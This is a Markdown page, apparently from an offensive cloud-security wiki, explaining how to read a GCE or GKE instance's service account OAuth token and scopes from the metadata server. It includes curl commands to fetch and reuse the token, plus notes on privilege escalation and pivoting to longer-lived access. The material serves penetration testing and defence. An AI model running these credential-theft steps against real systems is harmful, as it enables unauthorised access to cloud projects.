---
title: "Service account token: OAuth token and scopes from the metadata server"
description: "Pulling the attached service account's OAuth token and scopes from the metadata server's service-accounts endpoint."
keywords:
  - metadata token
  - service account
  - OAuth token
  - scopes
  - GCE metadata
  - computeMetadata
---

# Service account token

On any Compute Engine instance or GKE node, the metadata server hands out the attached service account's live OAuth access token. Export it and you act as that service account for as long as the token is valid, with whatever roles it holds across the project.

## Reading the token and scopes

```bash
# the default (attached) service account
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
# -> {"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}

# the granted scopes decide what the token can call
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'

# the account's email, and the full tree
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'
```

## Using the token

```bash
TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" \
  'https://cloudresourcemanager.googleapis.com/v1/projects'
```

## Exploitation notes

- The **scopes** cap the token independently of IAM: a token scoped only to `cloud-platform` is broad, but legacy scopes like `devstorage.read_only` limit it regardless of the account's roles. Read the scopes first.
- Default Compute Engine service accounts historically hold the broad **Editor** role on the project, so an unscoped token is often project-wide write.
- The token is short-lived (about an hour); for durable access pivot to [service account keys](../service-account-keys.md) or [impersonation](../../identity/service-account-impersonation/index.md).

## Tools

- **gcloud** once the token is exported (`CLOUDSDK_AUTH_ACCESS_TOKEN`).
- **curl** against the metadata server and the Google APIs.

## References

- [Google: VM metadata and tokens](https://cloud.google.com/compute/docs/metadata/overview)
- [Rhino Security Labs: GCP privilege escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
